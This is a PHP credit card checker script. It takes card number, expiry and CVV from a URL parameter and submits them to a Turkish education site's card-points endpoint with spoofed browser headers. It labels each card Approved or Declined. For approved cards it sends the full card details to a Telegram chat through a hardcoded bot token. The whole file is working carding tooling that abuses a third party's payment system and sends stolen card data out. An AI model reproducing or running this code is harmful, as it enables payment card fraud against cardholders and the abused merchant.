<?php
error_reporting(0);

$token = "8245039266:AAEDCRC_8AkFl0RVtJpGPLS-ECRzcc0GQNY";  // Telegram Bot tokenini buraya yaz
$chat_id = "-1002770994391"; // Telegram chat id (canlılar için)

if (!isset($_GET['lista'])) {
    http_response_code(400);
    exit("Missing lista param");
}

$lista = $_GET['lista'];
$cc_details = explode('|', $lista);

if (count($cc_details) != 4) {
    echo "❌InvalidFormat|{$lista}|0,00 TL|@belkidoner";
    exit;
}

list($c, $m, $y, $cv) = $cc_details;
if (strlen($y) === 4) {
    $y = substr($y, -2);
}

$postData = http_build_query([
    'KartNo' => $c,
    'KartAd' => 'emir cevk',
    'KartCvc' => $cv,
    'KartAy' => $m,
    'KartYil' => $y,
    'Total' => 12599.1
]);

$ch = curl_init('https://www.tongucakademi.com/uyelikpaketleri/getcardpoint');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: */*',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.tongucakademi.com',
    'referer: https://www.tongucakademi.com/uyelikpaketleri/odeme/276',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
]);
$response = curl_exec($ch);
curl_close($ch);

$resJson = json_decode($response, true);

if (isset($resJson['message']) && strpos($resJson['message'], 'puanınız') !== false) {
    $puan = $resJson['message'];
    $output = "✅Approved|{$lista}|{$puan}|@belkidoner";
    
    // Telegram'a log gönder
    sendTelegramLog($token, $chat_id, $output);
    
    echo $output;
    exit;
} else {
    echo "❌Declined|{$lista}|0,00 TL|@belkidoner";
    exit;
}

function sendTelegramLog($token, $chat_id, $text) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_exec($ch);
    curl_close($ch);
}
